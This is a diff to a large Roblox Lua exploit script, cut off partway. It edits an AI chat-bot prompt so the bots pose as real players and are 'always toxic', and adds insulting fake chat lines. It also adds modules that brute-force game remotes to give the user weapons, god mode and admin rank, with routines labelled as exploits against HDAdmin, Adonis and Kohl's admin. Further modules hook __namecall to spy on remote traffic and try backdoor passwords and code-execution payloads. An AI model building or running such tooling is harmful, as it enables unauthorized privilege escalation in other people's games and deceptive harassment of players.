@@ -29083,10 +29083,10 @@ local GEMINI_TIMEOUT        = 8
 local SYSTEM_PROMPT = [[You are a real Roblox player in a game called ]] .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. [[.
 Your job is to blend in with real players naturally.
 Strict rules:
-- Replies must be 1-6 words ONLY, no exceptions
+- Replies must be 1-11 words ONLY, no exceptions
 - Read the last few messages for context and reply relevantly
 - Never repeat what was just said
-- Vary your style: sometimes ask questions, sometimes react, sometimes be sarcastic
+- Vary your style: sometimes ask questions, always react, always be toxic
 - Use current Gen Z / Roblox slang naturally: fr, ngl, bro, no cap, lowkey, W, L, ratio, based, skill issue, cooked, mid, bussin, it's giving, no shot, on god, slay, rizzler, fanum tax, etc.
 - React to the specific topic being discussed (trading, dying, winning, lagging, etc.)
 - Occasionally be funny or slightly unhinged like a real player
@@ -29112,7 +29112,7 @@ local NAME_NUMBERS = {
     "1", "2", "3", "99", "100", "1337", "2010", "2011", "XD"
 }
 local FAKE_MESSAGES = {
-    "lol", "bro what", "gg", "this game is so fun", "anyone wanna trade?",
+    "lol", "bro what", "gg", "this game is so fun, headass this game dookie", "anyone wanna trade?",
     "how do i get robux", "skill issue", "nah bro", "wait what just happened",
     "this is actually crazy", "fr fr", "no way", "lets goooo", "omg",
     "why is everyone so good", "i just joined", "can someone help me",
@@ -29127,7 +29127,7 @@ local FAKE_MESSAGES = {
     "😭", "bro zuka?", "we're so back", "no cap", "on god", "bro thinks hes slick",
     "wait is that allowed", "how", "WHY", "ok that was cold", "yooo",
     "ngl this slaps", "i cant", "im dead 💀", "respectfully no",
-    "who asked", "i did", "carry me", "im trying my best ok",
+    "who asked", "i did", "carry me", "im trying my best ok", "take that somewhere else bro we dont wanna see that"
 }
 local GENERIC_REPLIES = {
     "lol", "fr", "real", "same", "nah", "yep", "facts", "based",
@@ -32191,6 +32191,1223 @@ end
 function Modules.GUICreator:Toggle()
     if self.State.IsEnabled then self:Disable() else self:Enable() end
 end
+Modules.ActionRemoteForcer = {
+    State = {
+        GenericRemotes = {},
+        LastScanTime = 0,
+    },
+    Config = {
+        GenericRemoteNames = {
+            "Action", "Actions",
+            "Request", "Requests",
+            "Event", "Events",
+            "Handler", "Handle",
+            "Bridge", "Network",
+            "Remote", "Remotes",
+            "Main", "Core",
+            "Game", "GameEvent",
+            "Server", "ServerEvent",
+            "Client", "ClientEvent",
+            "System", "Systems",
+            "Trigger", "Triggers",
+            "Command", "Commands",
+            "Signal", "Signals",
+            "Net", "NetEvent",
+        },
+        EquipTypeArgs = {
+            "EquipWeapon", "Equip", "equip", "EQUIP",
+            "EquipTool", "EquipItem",
+            "GiveWeapon", "GiveTool", "GiveItem", "Give", "give",
+            "AddWeapon", "AddTool", "AddItem", "Add",
+            "UnlockWeapon", "Unlock", "unlock",
+            "PurchaseWeapon", "Purchase", "Buy", "buy",
+            "SelectWeapon", "Select", "select",
+            "SetWeapon", "Set",
+            "LoadWeapon", "Load",
+            "GrantWeapon", "Grant",
+            "SetKit", "SelectKit", "EquipKit",
+            "SetClass", "SelectClass", "ChangeClass",
+            "SetLoadout", "EquipLoadout", "SelectLoadout",
+            "AdminGive", "ForceEquip", "DevGive",
+        },
+        ScanServices = {
+            "ReplicatedStorage",
+            "ReplicatedFirst",
+        }
+    }
+}
+function Modules.ActionRemoteForcer:ScanForGenericRemotes()
+    self.State.GenericRemotes = {}
+    local found = 0
+    local function isGenericName(name)
+        local lower = name:lower()
+        for _, pattern in ipairs(self.Config.GenericRemoteNames) do
+            if lower == pattern:lower() or lower:find(pattern:lower()) then
+                return true
+            end
+        end
+        return false
+    end
+    local function scanContainer(container)
+        for _, desc in ipairs(container:GetDescendants()) do
+            if desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction") then
+                if isGenericName(desc.Name) then
+                    table.insert(self.State.GenericRemotes, {
+                        Remote = desc,
+                        Name = desc.Name,
+                        Path = desc:GetFullName(),
+                        Type = desc.ClassName,
+                    })
+                    found = found + 1
+                end
+            end
+        end
+    end
+    for _, serviceName in ipairs(self.Config.ScanServices) do
+        local ok, service = pcall(game.GetService, game, serviceName)
+        if ok and service then
+            scanContainer(service)
+        end
+    end
+    self.State.LastScanTime = tick()
+    DoNotif(string.format("Found %d generic action remotes", found), 2)
+    return found
+end
+function Modules.ActionRemoteForcer:ListGenericRemotes()
+    if #self.State.GenericRemotes == 0 then
+        DoNotif("No generic remotes found. Run ;scanaction first.", 3)
+        return
+    end
+    print("\n=== GENERIC ACTION REMOTES ===")
+    for i, data in ipairs(self.State.GenericRemotes) do
+        print(string.format("[%d] [%s] %s → %s", i, data.Type, data.Name, data.Path))
+    end
+    print(string.format("Total: %d", #self.State.GenericRemotes))
+    DoNotif(string.format("Listed %d generic remotes (check console)", #self.State.GenericRemotes), 2)
+end
+function Modules.ActionRemoteForcer:TryActionEquip(weaponIdentifier)
+    if #self.State.GenericRemotes == 0 then
+        DoNotif("No generic remotes cached. Scanning first...", 2)
+        self:ScanForGenericRemotes()
+    end
+    if #self.State.GenericRemotes == 0 then
+        DoNotif("No generic remotes found in this game.", 3)
+        return
+    end
+    local attempts = 0
+    local successes = 0
+    local w = weaponIdentifier
+    local function buildArgSets(typeArg)
+        return {
+            {typeArg, w},
+            {typeArg, w, true},
+            {typeArg, w, 1},
+            {typeArg, {Weapon = w}},
+            {typeArg, {weapon = w}},
+            {typeArg, {Name = w}},
+            {typeArg, {name = w}},
+            {typeArg, {Tool = w}},
+            {typeArg, {Item = w}},
+            {typeArg, {id = w}},
+            {typeArg, {ID = w}},
+            {typeArg, {ItemId = w}},
+            {typeArg, {WeaponName = w}},
+            {{Action = typeArg, Weapon = w}},
+            {{action = typeArg, weapon = w}},
+            {{Action = typeArg, Name = w}},
+            {{Type = typeArg, Weapon = w}},
+            {{type = typeArg, weapon = w}},
+            {{Event = typeArg, Weapon = w}},
+            {{Request = typeArg, Weapon = w}},
+            {{Command = typeArg, Weapon = w}},
+            {{Command = typeArg, Item = w}},
+            {{Action = typeArg, Tool = w}},
+            {{Action = typeArg, Item = w}},
+            {{Action = typeArg, ItemId = w}},
+            {{Action = typeArg, id = w}},
+            {{Action = typeArg, Data = {Weapon = w}}},
+            {{Action = typeArg, Args = {w}}},
+            {{Action = typeArg, Args = {Weapon = w}}},
+        }
+    end
+    DoNotif(string.format("Trying action equip for '%s'...", w), 2)
+    print(string.format("\n=== ACTION EQUIP: %s ===", w))
+    for _, data in ipairs(self.State.GenericRemotes) do
+        for _, typeArg in ipairs(self.Config.EquipTypeArgs) do
+            local argSets = buildArgSets(typeArg)
+            for _, argSet in ipairs(argSets) do
+                local ok = pcall(function()
+                    if data.Type == "RemoteEvent" then
+                        data.Remote:FireServer(unpack(argSet))
+                    else
+                        data.Remote:InvokeServer(unpack(argSet))
+                    end
+                end)
+                attempts = attempts + 1
+                if ok then
+                    successes = successes + 1
+                end
+                task.wait(0.02)
+            end
+        end
+    end
+    print(string.format("Done: %d/%d attempts fired without error", successes, attempts))
+    DoNotif(string.format("Action equip done: %d/%d succeeded", successes, attempts), 2)
+end
+function Modules.ActionRemoteForcer:StartSpy()
+    if self._spyHook then
+        DoNotif("Spy already running. Use ;stopactionspy to stop.", 3)
+        return
+    end
+    local mt = getrawmetatable(game)
+    local oldNamecall = mt.__namecall
+    setreadonly(mt, false)
+    self._spyHook = newcclosure(function(self_obj, ...)
+        local method = getnamecallmethod()
+        if method == "FireServer" or method == "InvokeServer" then
+            local name = self_obj.Name:lower()
+            local isGeneric = false
+            for _, pattern in ipairs(Modules.ActionRemoteForcer.Config.GenericRemoteNames) do
+                if name:find(pattern:lower()) then
+                    isGeneric = true
+                    break
+                end
+            end
+            if isGeneric then
+                local args = {...}
+                print(string.format("[ActionSpy] %s:%s(%s)",
+                    self_obj:GetFullName(),
+                    method,
+                    (function()
+                        local parts = {}
+                        for _, v in ipairs(args) do
+                            if type(v) == "table" then
+                                local tp = {}
+                                for k2, v2 in pairs(v) do
+                                    table.insert(tp, tostring(k2).."="..tostring(v2))
+                                end
+                                table.insert(parts, "{" .. table.concat(tp, ", ") .. "}")
+                            else
+                                table.insert(parts, tostring(v))
+                            end
+                        end
+                        return table.concat(parts, ", ")
+                    end)()
+                ))
+            end
+        end
+        return oldNamecall(self_obj, ...)
+    end)
+    mt.__namecall = self._spyHook
+    setreadonly(mt, true)
+    DoNotif("Action spy started. Perform actions in-game and check console.", 2)
+end
+function Modules.ActionRemoteForcer:StopSpy()
+    if not self._spyHook then
+        DoNotif("Spy is not running.", 3)
+        return
+    end
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    mt.__namecall = self._spyHook
+    setreadonly(mt, true)
+    self._spyHook = nil
+    DoNotif("Action spy stopped.", 2)
+end
+RegisterCommand({
+    Name = "scanaction",
+    Aliases = {"sa"},
+    Description = "Scan for generic action/event bus remotes"
+}, function()
+    Modules.ActionRemoteForcer:ScanForGenericRemotes()
+end)
+RegisterCommand({
+    Name = "listaction",
+    Aliases = {"la"},
+    Description = "List all found generic action remotes (check console)"
+}, function()
+    Modules.ActionRemoteForcer:ListGenericRemotes()
+end)
+RegisterCommand({
+    Name = "actionequip",
+    Aliases = {"ae"},
+    Description = "Try to equip weapon via action bus remotes. Usage: ;actionequip <weaponName>"
+}, function(args)
+    if not args[1] then
+        DoNotif("Usage: ;actionequip <weaponName>", 3)
+        return
+    end
+    local weaponName = table.concat(args, " ")
+    Modules.ActionRemoteForcer:TryActionEquip(weaponName)
+end)
+RegisterCommand({
+    Name = "actionspy",
+    Aliases = {"aspy"},
+    Description = "Hook generic remotes and print their args to console when the game fires them"
+}, function()
+    Modules.ActionRemoteForcer:StartSpy()
+end)
+RegisterCommand({
+    Name = "stopactionspy",
+    Aliases = {"stopacspy"},
+    Description = "Stop the action remote spy"
+}, function()
+    Modules.ActionRemoteForcer:StopSpy()
+end)
+Modules.AdminRemoteForcer = {
+    State = {
+        AdminRemotes = {},
+        SpyHook = nil,
+    },
+    Config = {
+        AdminRemoteNames = {
+            "Admin", "AdminRemote", "AdminEvent", "AdminFunction",
+            "AdminCommand", "AdminAction", "AdminRequest",
+            "AdminBridge", "AdminHandler",
+            "Dev", "DevRemote", "DevEvent", "DevFunction",
+            "Debug", "DebugRemote", "DebugEvent",
+            "Test", "TestRemote", "TestEvent",
+            "Cheat", "CheatRemote",
+            "Rank", "SetRank", "GiveRank", "UpdateRank",
+            "Permission", "SetPermission", "Permissions",
+            "Role", "SetRole", "GiveRole",
+            "Promote", "Demote",
+            "HDAdmin", "HD_Admin", "MainRemote",
+            "Adonis", "AdonisRemote", "AdonisEvent",
+            "Kohls", "KohlsAdmin", "KA_Remote",
+            "CommandRemote", "CommandEvent",
+            "Cmds", "CmdRemote",
+            "God", "GodMode", "Invincible", "Invincibility",
+            "Immortal", "NoClip",
+            "GiveAll", "GiveAllWeapons", "GiveAllItems",
+            "GrantAll", "UnlockAll",
+            "AdminGive", "DevGive",
+            "Ban", "Kick", "Mute", "Warn",
+            "Moderate", "Moderation",
+            "Teleport", "TpAll", "TeleportAll",
+            "Kill", "KillAll",
+            "Reset", "ResetAll",
+            "Announce", "GlobalAnnounce",
+            "ServerMessage", "Message",
+            "Shutdown",
+        },
+        HDAdmin = {
+            RemoteNames = {"MainRemote", "HDAdmin", "HD_Admin", "Remote"},
+            RankArgs = {
+                {[1] = "setRank", [2] = LocalPlayer.Name, [3] = 6},
+                {[1] = "setRank", [2] = LocalPlayer.Name, [3] = 5},
+                {[1] = "setRank", [2] = LocalPlayer.Name, [3] = 4},
+                {Command = "setRank", Player = LocalPlayer.Name, Rank = 6},
+                {Command = "setRank", Player = LocalPlayer.Name, Rank = 5},
+            },
+        },
+        Adonis = {
+            RemoteNames = {"Adonis", "AdonisRemote", "Remote", "AdonisEvent"},
+            Commands = {
+                ":sm Hello",
+                ":god " .. (LocalPlayer and LocalPlayer.Name or ""),
+                ":fly " .. (LocalPlayer and LocalPlayer.Name or ""),
+                ":give " .. (LocalPlayer and LocalPlayer.Name or "") .. " all",
+            },
+        },
+        Kohls = {
+            RemoteNames = {"Kohls", "KohlsAdmin", "KA_Remote", "Command"},
+            Commands = {
+                "god me",
+                "fly me",
+                "give me all",
+                "rank me 5",
+            },
+        },
+        GenericAdminCommands = {
+            "god", "god me", "godmode", "invincible",
+            "god " .. (LocalPlayer and LocalPlayer.Name or ""),
+            "give all", "giveall", "give me all",
+            "give " .. (LocalPlayer and LocalPlayer.Name or "") .. " all",
+            "rank me 5", "rank me max", "rank me admin",
+            "setrank me 5", "setrank me 6",
+            "fly", "fly me",
+            "fly " .. (LocalPlayer and LocalPlayer.Name or ""),
+            "noclip", "noclip me",
+            "sm test", "announce test",
+        },
+        ScanServices = {"ReplicatedStorage", "ReplicatedFirst"},
+    }
+}
+function Modules.AdminRemoteForcer:Scan()
+    self.State.AdminRemotes = {}
+    local found = 0
+    local function isAdminName(name)
+        local lower = name:lower()
+        for _, pattern in ipairs(self.Config.AdminRemoteNames) do
+            if lower == pattern:lower() or lower:find(pattern:lower()) then
+                return true
+            end
+        end
+        return false
+    end
+    local function scanContainer(container)
+        for _, desc in ipairs(container:GetDescendants()) do
+            if desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction") then
+                if isAdminName(desc.Name) then
+                    table.insert(self.State.AdminRemotes, {
+                        Remote = desc,
+                        Name = desc.Name,
+                        Path = desc:GetFullName(),
+                        Type = desc.ClassName,
+                    })
+                    found = found + 1
+                end
+            end
+        end
+    end
+    for _, svc in ipairs(self.Config.ScanServices) do
+        local ok, service = pcall(game.GetService, game, svc)
+        if ok and service then scanContainer(service) end
+    end
+    DoNotif(string.format("Found %d admin/dev remotes", found), found > 0 and 2 or 3)
+    return found
+end
+function Modules.AdminRemoteForcer:List()
+    if #self.State.AdminRemotes == 0 then
+        DoNotif("No admin remotes cached. Run ;scanadmin first.", 3)
+        return
+    end
+    print("\n=== ADMIN / DEV REMOTES ===")
+    for i, data in ipairs(self.State.AdminRemotes) do
+        print(string.format("[%d] [%s] %s\n     Path: %s", i, data.Type, data.Name, data.Path))
+    end
+    print(string.format("\nTotal: %d", #self.State.AdminRemotes))
+    DoNotif(string.format("Listed %d admin remotes (check console)", #self.State.AdminRemotes), 2)
+end
+function Modules.AdminRemoteForcer:TryHDAdmin()
+    DoNotif("Trying HDAdmin exploit...", 2)
+    print("\n=== TRYING HDADMIN ===")
+    local targetRemote = nil
+    local rs = game:GetService("ReplicatedStorage")
+    for _, desc in ipairs(rs:GetDescendants()) do
+        if desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction") then
+            local nameLower = desc.Name:lower()
+            for _, rn in ipairs(self.Config.HDAdmin.RemoteNames) do
+                if nameLower == rn:lower() then
+                    targetRemote = desc
+                    print("Found HDAdmin remote: " .. desc:GetFullName())
+                    break
+                end
+            end
+            if targetRemote then break end
+        end
+    end
+    if not targetRemote then
+        for _, data in ipairs(self.State.AdminRemotes) do
+            for _, rn in ipairs(self.Config.HDAdmin.RemoteNames) do
+                if data.Name:lower() == rn:lower() then
+                    targetRemote = data.Remote
+                    break
+                end
+            end
+        end
+    end
+    if not targetRemote then
+        DoNotif("HDAdmin remote not found. May not be using HDAdmin.", 3)
+        return
+    end
+    local successes = 0
+    for _, args in ipairs(self.Config.HDAdmin.RankArgs) do
+        local ok, result = pcall(function()
+            if targetRemote:IsA("RemoteFunction") then
+                return targetRemote:InvokeServer(args)
+            else
+                targetRemote:FireServer(args)
+                return true
+            end
+        end)
+        if ok then
+            successes = successes + 1
+            print(string.format("  OK: fired rank args successfully (result: %s)", tostring(result)))
+        end
+        task.wait(0.1)
+    end
+    local flatArgs = {
+        {"setRank", LocalPlayer.Name, 6},
+        {"setRank", LocalPlayer.Name, 5},
+        {"setRank", LocalPlayer.Name, 4},
+        {"giveRank", LocalPlayer.Name, 6},
+        {"rank", LocalPlayer.Name, 6},
+    }
+    for _, args in ipairs(flatArgs) do
+        pcall(function()
+            if targetRemote:IsA("RemoteFunction") then
+                targetRemote:InvokeServer(unpack(args))
+            else
+                targetRemote:FireServer(unpack(args))
+            end
+        end)
+        task.wait(0.1)
+    end
+    DoNotif(string.format("HDAdmin attempts done (%d clean fires). Check if rank changed.", successes), 2)
+end
+function Modules.AdminRemoteForcer:TryAdonis()
+    DoNotif("Trying Adonis admin exploit...", 2)
+    print("\n=== TRYING ADONIS ===")
+    local targetRemote = nil
+    local rs = game:GetService("ReplicatedStorage")
+    for _, desc in ipairs(rs:GetDescendants()) do
+        if desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction") then
+            for _, rn in ipairs(self.Config.Adonis.RemoteNames) do
+                if desc.Name:lower() == rn:lower() then
+                    targetRemote = desc
+                    print("Found Adonis remote: " .. desc:GetFullName())
+                    break
+                end
+            end
+            if targetRemote then break end
+        end
+    end
+    if not targetRemote then
+        DoNotif("Adonis remote not found.", 3)
+        return
+    end
+    for _, cmd in ipairs(self.Config.Adonis.Commands) do
+        pcall(function()
+            if targetRemote:IsA("RemoteFunction") then
+                targetRemote:InvokeServer(cmd)
+            else
+                targetRemote:FireServer(cmd)
+            end
+        end)
+        print("  Tried: " .. cmd)
+        task.wait(0.15)
+    end
+    DoNotif("Adonis attempts done. Check console/game.", 2)
+end
+function Modules.AdminRemoteForcer:TryKohls()
+    DoNotif("Trying Kohl's admin exploit...", 2)
+    print("\n=== TRYING KOHL'S ADMIN ===")
+    local targetRemote = nil
+    local rs = game:GetService("ReplicatedStorage")
+    for _, desc in ipairs(rs:GetDescendants()) do
+        if desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction") then
+            for _, rn in ipairs(self.Config.Kohls.RemoteNames) do
+                if desc.Name:lower() == rn:lower() then
+                    targetRemote = desc
+                    print("Found Kohl's remote: " .. desc:GetFullName())
+                    break
+                end
+            end
+            if targetRemote then break end
+        end
+    end
+    if not targetRemote then
+        DoNotif("Kohl's remote not found.", 3)
+        return
+    end
+    for _, cmd in ipairs(self.Config.Kohls.Commands) do
+        pcall(function()
+            if targetRemote:IsA("RemoteFunction") then
+                targetRemote:InvokeServer(cmd)
+            else
+                targetRemote:FireServer(cmd)
+            end
+        end)
+        print("  Tried: " .. cmd)
+        task.wait(0.15)
+    end
+    DoNotif("Kohl's attempts done. Check console/game.", 2)
+end
+function Modules.AdminRemoteForcer:TrySetRank()
+    if #self.State.AdminRemotes == 0 then
+        self:Scan()
+    end
+    local attempts = 0
+    local player = LocalPlayer.Name
+    local rankArgSets = {
+        {"setRank", player, 6},
+        {"setRank", player, 5},
+        {"giveRank", player, 6},
+        {"rank", player, 5},
+        {"promote", player},
+        {"setAdmin", player},
+        {"makeAdmin", player},
+        {{Command = "setRank", Player = player, Rank = 6}},
+        {{Command = "setRank", Player = player, Rank = 5}},
+        {{action = "setRank", player = player, rank = 6}},
+        {{type = "rank", target = player, level = 6}},
+        {player, 6},
+        {player, 5},
+        {player, "admin"},
+        {player, "owner"},
+    }
+    DoNotif("Trying to set rank on all admin remotes...", 2)
+    for _, data in ipairs(self.State.AdminRemotes) do
+        for _, argSet in ipairs(rankArgSets) do
+            pcall(function()
+                if data.Type == "RemoteFunction" then
+                    data.Remote:InvokeServer(unpack(argSet))
+                else
+                    data.Remote:FireServer(unpack(argSet))
+                end
+            end)
+            attempts = attempts + 1
+            task.wait(0.05)
+        end
+    end
+    DoNotif(string.format("Rank attempts done: %d total. Check in-game.", attempts), 2)
+end
+function Modules.AdminRemoteForcer:TryGod()
+    if #self.State.AdminRemotes == 0 then self:Scan() end
+    local player = LocalPlayer.Name
+    local godArgSets = {
+        {"god", player},
+        {"god", LocalPlayer},
+        {"godmode", player},
+        {"godmode", LocalPlayer},
+        {"invincible", player},
+        {{Command = "god", Player = player}},
+        {{action = "god", target = player}},
+        {{type = "god", player = player}},
+        {"god"},
+        {"godme"},
+    }
+    local attempts = 0
+    DoNotif("Trying god mode remotes...", 2)
+    for _, data in ipairs(self.State.AdminRemotes) do
+        for _, argSet in ipairs(godArgSets) do
+            pcall(function()
+                if data.Type == "RemoteFunction" then
+                    data.Remote:InvokeServer(unpack(argSet))
+                else
+                    data.Remote:FireServer(unpack(argSet))
+                end
+            end)
+            attempts = attempts + 1
+            task.wait(0.03)
+        end
+    end
+    DoNotif(string.format("God mode attempts: %d. Check health bar.", attempts), 2)
+end
+function Modules.AdminRemoteForcer:TryGiveAll()
+    if #self.State.AdminRemotes == 0 then self:Scan() end
+    local player = LocalPlayer.Name
+    local giveArgSets = {
+        {"giveAll", player},
+        {"giveall", player},
+        {"give", player, "all"},
+        {"giveAllWeapons", player},
+        {"unlockAll", player},
+        {"grantAll", player},
+        {{Command = "giveAll", Player = player}},
+        {{action = "giveAll", target = player}},
+        {{Command = "give", Player = player, Item = "all"}},
+        {"giveAll"},
+        {"unlockAll"},
+    }
+    local attempts = 0
+    DoNotif("Trying give-all remotes...", 2)
+    for _, data in ipairs(self.State.AdminRemotes) do
+        for _, argSet in ipairs(giveArgSets) do
+            pcall(function()
+                if data.Type == "RemoteFunction" then
+                    data.Remote:InvokeServer(unpack(argSet))
+                else
+                    data.Remote:FireServer(unpack(argSet))
+                end
+            end)
+            attempts = attempts + 1
+            task.wait(0.03)
+        end
+    end
+    DoNotif(string.format("Give-all attempts: %d. Check backpack.", attempts), 2)
+end
+function Modules.AdminRemoteForcer:TryAdminCommand(commandStr)
+    if #self.State.AdminRemotes == 0 then self:Scan() end
+    local attempts = 0
+    local argSets = {
+        {commandStr},
+        {commandStr, LocalPlayer.Name},
+        {{Command = commandStr}},
+        {{command = commandStr}},
+        {{action = commandStr}},
+        {{cmd = commandStr}},
+        {"command", commandStr},
+        {"cmd", commandStr},
+        {"run", commandStr},
+        {"execute", commandStr},
+    }
+    DoNotif(string.format("Firing admin command: %s", commandStr), 2)
+    for _, data in ipairs(self.State.AdminRemotes) do
+        for _, argSet in ipairs(argSets) do
+            pcall(function()
+                if data.Type == "RemoteFunction" then
+                    data.Remote:InvokeServer(unpack(argSet))
+                else
+                    data.Remote:FireServer(unpack(argSet))
+                end
+            end)
+            attempts = attempts + 1
+            task.wait(0.03)
+        end
+    end
+    DoNotif(string.format("Command attempts: %d.", attempts), 2)
+end
+function Modules.AdminRemoteForcer:StartSpy()
+    if self.State.SpyHook then
+        DoNotif("Admin spy already running.", 3)
+        return
+    end
+    local mt = getrawmetatable(game)
+    local oldNamecall = mt.__namecall
+    setreadonly(mt, false)
+    self.State.SpyHook = newcclosure(function(self_obj, ...)
+        local method = getnamecallmethod()
+        if method == "FireServer" or method == "InvokeServer"
+        or method == "FireClient" or method == "OnClientEvent" then
+            local nameLower = self_obj.Name:lower()
+            local isAdmin = false
+            for _, pattern in ipairs(Modules.AdminRemoteForcer.Config.AdminRemoteNames) do
+                if nameLower:find(pattern:lower()) then
+                    isAdmin = true
+                    break
+                end
+            end
+            if isAdmin then
+                local args = {...}
+                local parts = {}
+                for _, v in ipairs(args) do
+                    if type(v) == "table" then
+                        local tp = {}
+                        for k, val in pairs(v) do
+                            table.insert(tp, tostring(k).."="..tostring(val))
+                        end
+                        table.insert(parts, "{" .. table.concat(tp, ", ") .. "}")
+                    else
+                        table.insert(parts, tostring(v))
+                    end
+                end
+                print(string.format("[AdminSpy] %s:%s(%s)",
+                    self_obj:GetFullName(), method, table.concat(parts, ", ")))
+            end
+        end
+        return oldNamecall(self_obj, ...)
+    end)
+    mt.__namecall = self.State.SpyHook
+    setreadonly(mt, true)
+    DoNotif("Admin spy started. Perform admin actions in-game and check console.", 2)
+end
+function Modules.AdminRemoteForcer:StopSpy()
+    if not self.State.SpyHook then
+        DoNotif("Admin spy not running.", 3)
+        return
+    end
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    self.State.SpyHook = nil
+    setreadonly(mt, true)
+    DoNotif("Admin spy stopped. Restart script to fully restore __namecall.", 2)
+end
+RegisterCommand({
+    Name = "scanadmin",
+    Aliases = {"scana"},
+    Description = "Scan for admin/dev remotes"
+}, function()
+    Modules.AdminRemoteForcer:Scan()
+end)
+RegisterCommand({
+    Name = "rlistadmin",
+    Aliases = {"lad"},
+    Description = "List all found admin remotes (check console)"
+}, function()
+    Modules.AdminRemoteForcer:List()
+end)
+RegisterCommand({
+    Name = "tryhdadmin",
+    Aliases = {"hda"},
+    Description = "Try to exploit HDAdmin rank system"
+}, function()
+    if #Modules.AdminRemoteForcer.State.AdminRemotes == 0 then
+        Modules.AdminRemoteForcer:Scan()
+    end
+    Modules.AdminRemoteForcer:TryHDAdmin()
+end)
+RegisterCommand({
+    Name = "tryadonis",
+    Aliases = {"adonispayload"},
+    Description = "Try to exploit Adonis admin"
+}, function()
+    if #Modules.AdminRemoteForcer.State.AdminRemotes == 0 then
+        Modules.AdminRemoteForcer:Scan()
+    end
+    Modules.AdminRemoteForcer:TryAdonis()
+end)
+RegisterCommand({
+    Name = "trykohl",
+    Aliases = {"kohl"},
+    Description = "Try to exploit Kohl's admin"
+}, function()
+    if #Modules.AdminRemoteForcer.State.AdminRemotes == 0 then
+        Modules.AdminRemoteForcer:Scan()
+    end
+    Modules.AdminRemoteForcer:TryKohls()
+end)
+RegisterCommand({
+    Name = "tryrank",
+    Aliases = {"setrank"},
+    Description = "Try to set your own rank via exposed remotes"
+}, function()
+    Modules.AdminRemoteForcer:TrySetRank()
+end)
+RegisterCommand({
+    Name = "trygod",
+    Aliases = {},
+    Description = "Try to enable god mode via admin remotes"
+}, function()
+    Modules.AdminRemoteForcer:TryGod()
+end)
+RegisterCommand({
+    Name = "trygiveall",
+    Aliases = {"giveall"},
+    Description = "Try to give yourself all weapons/items via admin remotes"
+}, function()
+    Modules.AdminRemoteForcer:TryGiveAll()
+end)
+RegisterCommand({
+    Name = "admincommand",
+    Aliases = {"acmd"},
+    Description = "Fire a command string on all admin remotes. Usage: ;admincommand <cmd>"
+}, function(args)
+    if not args[1] then
+        DoNotif("Usage: ;admincommand <command string>", 3)
+        return
+    end
+    local cmd = table.concat(args, " ")
+    Modules.AdminRemoteForcer:TryAdminCommand(cmd)
+end)
+RegisterCommand({
+    Name = "adminspy",
+    Aliases = {"adspy"},
+    Description = "Log all admin remote traffic to console"
+}, function()
+    Modules.AdminRemoteForcer:StartSpy()
+end)
+RegisterCommand({
+    Name = "stopaspy",
+    Aliases = {"sy"},
+    Description = "Stop admin spy"
+}, function()
+    Modules.AdminRemoteForcer:StopSpy()
+end)
+Modules.BackdoorForcer = {
+    State = {
+        SuspiciousRemotes = {},
+        SpyHook = nil,
+        SpyLog = {},
+    },
+    Config = {
+        ScanServices = {
+            "ReplicatedStorage",
+            "ReplicatedFirst",
+            "Workspace",
+            "Players",
+            "Lighting",
+            "SoundService",
+            "Teams",
+            "StarterGui",
+            "StarterPack",
+            "StarterPlayer",
+        },
+        SuspiciousNames = {
+            "Handle", "Part", "Model", "Script",
+            "Sound", "Value", "StringValue",
+            "Frame", "Image", "Button",
+            "Module", "Loader", "Load",
+            "Init", "Initialize", "Setup",
+            "Start", "Run", "Execute", "Exec",
+            "Eval", "Loadstring", "Load_String",
+            "Remote", "RE", "RF", "R",
+            "Event", "Function", "Func",
+            "Main", "Core", "Base",
+            "Hidden", "Secret", "Private",
+            "System", "Sys",
+            "Update", "Updater",
+            "Sync", "Syncer",
+            "Loader", "ModLoader",
+            "MainEvent", "LoadEvent",
+            "SB_Event", "SB_Function",
+            "Execute", "ExecuteScript",
+            "RunScript", "RunCode",
+            "Backdoor", "BD",
+            "Gate", "Access",
+            "Key", "Auth",
+            "Signal",
+            "Dispatcher",
+            "Receiver",
+            "1", "2", "3",
+            "e", "f", "g", "h",
+        },
+        CommonPasswords = {
+            "password", "1234", "admin", "secret",
+            "backdoor", "key", "auth", "access",
+            "owner", "creator", "dev",
+            "letmein", "open", "unlock",
+            "execute", "run", "load",
+            "lol", "lmao", "test", "debug",
+            "hehe", "haha", "xd",
+            "roblox", "rbx",
+            "exploit", "hack",
+            "0000", "9999", "1111", "0001",
+        },
+        ExecPayloads = {
+            [[print("BACKDOOR_CONFIRMED:" .. game.JobId)]],
+            [[game:GetService("ReplicatedStorage"):FindFirstChild("BackdoorTest") or Instance.new("StringValue", game:GetService("ReplicatedStorage")).Name == "BackdoorConfirmed"]],
+            [[local p = game.Players.LocalPlayer; if p and p.Character then p.Character.Humanoid.MaxHealth = math.huge; p.Character.Humanoid.Health = math.huge end]],
+            [[for _, v in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do if v:IsA("Tool") then v:Clone().Parent = game.Players.LocalPlayer.Backpack end end]],
+        },
+        SuspiciousRequirePatterns = {
+            "require(%d+)",
+            "loadstring",
+            "HttpService",
+        },
+    }
+}
+local function prettyArgs(args)
+    local parts = {}
+    for _, v in ipairs(args) do
+        if type(v) == "table" then
+            local tp = {}
+            for k, val in pairs(v) do
+                table.insert(tp, tostring(k).."="..tostring(val))
+            end
+            table.insert(parts, "{" .. table.concat(tp, ", ") .. "}")
+        else
+            table.insert(parts, tostring(v))
+        end
+    end
+    return table.concat(parts, ", ")
+end
+local function isSuspiciousName(name)
+    local lower = name:lower()
+    for _, pattern in ipairs(Modules.BackdoorForcer.Config.SuspiciousNames) do
+        if lower == pattern:lower() then
+            return true, "exact match: " .. pattern
+        end
+    end
+    if #name <= 2 then
+        return true, "very short name"
+    end
+    return false, nil
+end
+function Modules.BackdoorForcer:Scan(deepMode)
+    self.State.SuspiciousRemotes = {}
+    local found = 0
+    local scanned = 0
+    local services = deepMode and self.Config.ScanServices
+        or {"ReplicatedStorage", "ReplicatedFirst", "Workspace"}
+    local function scanContainer(container)
+        local ok, descendants = pcall(function()
+            return container:GetDescendants()
+        end)
+        if not ok then return end
+        for _, desc in ipairs(descendants) do
